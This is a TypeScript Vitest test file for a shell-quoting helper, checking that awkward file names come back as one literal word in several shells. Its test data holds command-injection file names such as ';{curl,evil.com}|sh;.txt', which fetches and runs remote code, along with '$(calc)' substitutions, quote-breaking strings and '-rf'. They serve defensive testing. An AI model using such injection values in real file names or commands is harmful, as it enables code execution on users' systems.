import { describe, expect, it } from "vitest";
import { dialectOf, quoteForShell, type QuoteDialect } from "./quote";

/** Reads a word back the way the shell does, for the quote forms `quoteForShell` writes. */
function read(dialect: QuoteDialect, word: string): string {
  if (dialect === "powershell") {
    if (!word.startsWith("'")) return word;
    expect(word.endsWith("'")).toBe(true);
    const inner = word.slice(1, -1);
    const undoubled = inner.replace(/(['\u2018\u2019\u201a\u201b])\1/gu, "$1");
    // Every quote character inside the string must have been doubled.
    expect(inner.replace(/(['\u2018\u2019\u201a\u201b])\1/gu, "")).not.toMatch(/['\u2018\u2019\u201a\u201b]/u);
    return undoubled;
  }
  if (dialect === "cmd" || dialect === "arg") {
    if (!word.startsWith('"')) return word;
    expect(word.endsWith('"')).toBe(true);
    expect(word.slice(1, -1)).not.toContain('"');
    return word.slice(1, -1);
  }
  let out = "";
  for (let i = 0; i < word.length; i++) {
    const c = word[i]!;
    if (c === "'") {
      const end = dialect === "fish" ? fishEnd(word, i + 1) : word.indexOf("'", i + 1);
      expect(end).toBeGreaterThan(i);
      const body = word.slice(i + 1, end);
      out += dialect === "fish" ? body.replace(/\\(['\\])/g, "$1") : body;
      i = end;
    } else if (c === "\\" && dialect === "posix") {
      out += word[++i];
    } else {
      expect(c).toMatch(/[\p{L}\p{N}_./:-]/u);
      out += c;
    }
  }
  return out;
}

function fishEnd(word: string, from: number): number {
  for (let i = from; i < word.length; i++) {
    if (word[i] === "\\") i++;
    else if (word[i] === "'") return i;
  }
  return -1;
}

const NASTY = [
  ";{curl,evil.com}|sh;.txt",
  "a$(calc).txt",
  "a${HOME}b",
  "a`calc`b",
  "a'; calc; 'b",
  "a\u2019; calc; \u2018b.txt",
  "a\u201ab\u201bc",
  "*?[x]",
  "~root",
  "-rf",
  "=ls",
  "a b  c",
  "#x",
  "a&b|c<d>e",
  "(sub)",
  "C:\\a b\\x",
  "$env:TEMP",
  "a\\b",
  "a\\'b",
  "\u65e5\u672c\u8a9e.txt",
];

const DIALECTS: QuoteDialect[] = ["powershell", "fish", "posix"];

describe("dialectOf", () => {
  it.each([
    ["pwsh", "powershell"],
    ["PowerShell.exe", "powershell"],
    ["powershell", "powershell"],
    ["cmd", "cmd"],
    ["CMD.EXE", "cmd"],
    ["fish", "fish"],
    ["zsh", "posix"],
    ["bash", "posix"],
    ["Local", "posix"],
  ])("reads %s as %s", (shell, dialect) => {
    expect(dialectOf(shell, false)).toBe(dialect);
    expect(dialectOf(shell, true)).toBe(dialect);
  });

  it("falls back to a program's argument rules when no shell is known", () => {
    expect(dialectOf(null, true)).toBe("arg");
    expect(dialectOf(undefined, false)).toBe("posix");
  });
});

describe("quoteForShell", () => {
  it.each(DIALECTS)("gives every awkward name back as one literal word in %s", (dialect) => {
    for (const name of NASTY) expect(read(dialect, quoteForShell(name, dialect))).toBe(name);
    for (const name of NASTY) expect(read(dialect, quoteForShell(name, dialect, true))).toBe(name);
  });

  it.each(["cmd", "arg"] as const)("keeps a name with shell punctuation inside double quotes in %s", (dialect) => {
    for (const name of ["a&b|c<d>e", "(sub)", "a^b", "a b", "a;b", "a,b", "a=b"]) {
      expect(quoteForShell(name, dialect)).toBe(`"${name}"`);
    }
  });

  it("quotes every quote character PowerShell reads as one", () => {
    expect(quoteForShell("a\u2019; calc; \u2018b.txt", "powershell")).toBe("'a\u2019\u2019; calc; \u2018\u2018b.txt'");
    expect(quoteForShell("a\u201ab\u201bc'd", "powershell")).toBe("'a\u201a\u201ab\u201b\u201bc''d'");
  });

  it("quotes what a shell would run, expand or split", () => {
    expect(quoteForShell("a$(calc).txt", "powershell")).toBe("'a$(calc).txt'");
    expect(quoteForShell("a;calc;.txt", "powershell")).toBe("'a;calc;.txt'");
    expect(quoteForShell(";{curl,evil.com}|sh;.txt", "posix")).toBe("';{curl,evil.com}|sh;.txt'");
    expect(quoteForShell("a'b", "posix")).toBe("'a'\\''b'");
    expect(quoteForShell("a'b\\c", "fish")).toBe("'a\\'b\\\\c'");
  });

  it("leaves a plain path as it is unless every word must be quoted", () => {
    expect(quoteForShell("/usr/local/bin/tool", "posix")).toBe("/usr/local/bin/tool");
    expect(quoteForShell("C:\\plain\\file.ts", "powershell")).toBe("C:\\plain\\file.ts");
    expect(quoteForShell("C:\\plain\\file.ts", "cmd")).toBe("C:\\plain\\file.ts");
    expect(quoteForShell("/tmp/\u4e2d\u6587.txt", "fish")).toBe("/tmp/\u4e2d\u6587.txt");
    expect(quoteForShell("/usr/local/bin/tool", "posix", true)).toBe("'/usr/local/bin/tool'");
    expect(quoteForShell("C:\\plain\\file.ts", "powershell", true)).toBe("'C:\\plain\\file.ts'");
  });

  it("quotes a path that would read as an option or a home directory", () => {
    expect(quoteForShell("-rf", "posix")).toBe("'-rf'");
    expect(quoteForShell("~root", "posix")).toBe("'~root'");
  });

  it("double-quotes what a program that reads its own input could split or read specially", () => {
    expect(quoteForShell("C:\\a b\\c.png", "arg")).toBe('"C:\\a b\\c.png"');
    expect(quoteForShell("C:\\100%\\x", "arg")).toBe('"C:\\100%\\x"');
    expect(quoteForShell("C:\\plain\\file.ts", "arg")).toBe("C:\\plain\\file.ts");
  });

  it.each(["powershell", "cmd", "fish", "posix", "arg"] as const)("refuses control characters in %s", (dialect) => {
    for (const name of ["a\nb", "a\rb", "a\x1bb", "a\tb", "a\x7fb", "a\u009bb"]) {
      expect(() => quoteForShell(name, dialect)).toThrow(/control characters/);
    }
  });

  it.each(['a"b', "100%", "a!b"])("refuses %s for cmd, which expands it even inside quotes", (name) => {
    expect(() => quoteForShell(name, "cmd")).toThrow(
      "Cannot paste this path safely in cmd.exe. Use PowerShell or a POSIX shell.",
    );
  });
});
